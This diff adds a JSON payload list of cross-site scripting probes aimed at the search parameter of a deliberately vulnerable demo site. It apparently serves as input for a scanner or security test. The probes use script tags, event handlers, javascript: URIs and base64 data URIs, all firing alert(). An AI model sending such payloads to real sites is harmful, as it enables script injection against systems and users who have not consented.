@@ -1,0 +1,116 @@
+[
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "';alert('XSS');//"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "';alert('XSS')//"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": ";alert('XSS');"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "alert('XSS');"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<script>alert('XSS')</script>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<img src=x onerror=alert('XSS')>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<svg/onload=alert('XSS')>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<iframe src=\"javascript:alert('XSS');\"></iframe>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<details/ontoggle=alert('XSS')>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<audio src/onerror=alert(1)>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<video src/onerror=alert(1)>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<marquee onstart=alert('XSS')>"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "<form action=\"javascript:alert('XSS')\"><input type=\"submit\">"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "\" onmouseover=alert('XSS') \""
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "' onmouseover=alert('XSS') '"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "\" onerror=alert('XSS')"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "type": "POST",
+        "parameter": "searchFor",
+        "payload": "' onerror=alert('XSS')"
+    }
+]
